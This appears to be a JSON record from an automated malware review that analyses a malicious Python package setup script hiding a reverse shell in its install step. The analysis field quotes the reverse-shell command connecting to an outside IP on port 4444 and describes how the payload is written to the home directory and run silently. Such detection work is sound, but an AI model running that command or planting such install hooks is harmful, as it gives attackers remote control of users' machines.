{
  "purpose": "The code appears to be a setup script for a Python package, but it contains malicious payloads intended to establish remote access.",
  "sources": "Reading the 'README.md' file, defining the 'Code' string with a reverse shell command, and the 'run' method in the 'execute' class which creates and executes a script",
  "sinks": "Execution of the reverse shell script via subprocess.Popen, writing to and renaming 'remote-access.py', and executing it with Python3",
  "flows": "Read 'README.md' -> Define malicious 'Code' string -> During installation, create 'remote-access.py' with reverse shell code -> Move 'remote-access.py' to user home directory -> Execute 'remote-access.py' with Python3",
  "anomalies": "Embedding a reverse shell command within a setup script, dynamically creating and executing a script that initiates a network connection to an external IP address, overwriting existing files without warning, and hiding malicious activity within a package setup process",
  "analysis": "The script imports setup tools and defines a custom installation command that, during package installation, writes a Python script containing a reverse shell payload. It then moves this script to the user's home directory, overwriting any existing file, and attempts to execute it silently. The reverse shell command 'os.system(\"bash -i >& /dev/tcp/10.3.0.95/4444 0>&1\")' opens a connection to an external IP address, indicating malicious intent. The code is embedded in a package setup file, likely to be executed during installation, which makes it a supply chain attack vector. The malicious code is obfuscated within the setup process, hidden inside legitimate-looking code, and designed to establish remote access without user consent.",
  "conclusion": "The code contains clear malicious behavior, including creating and executing a reverse shell to an external IP, hiding malicious code within a package setup process. This constitutes a high security risk and indicates intent to compromise systems during package installation.",
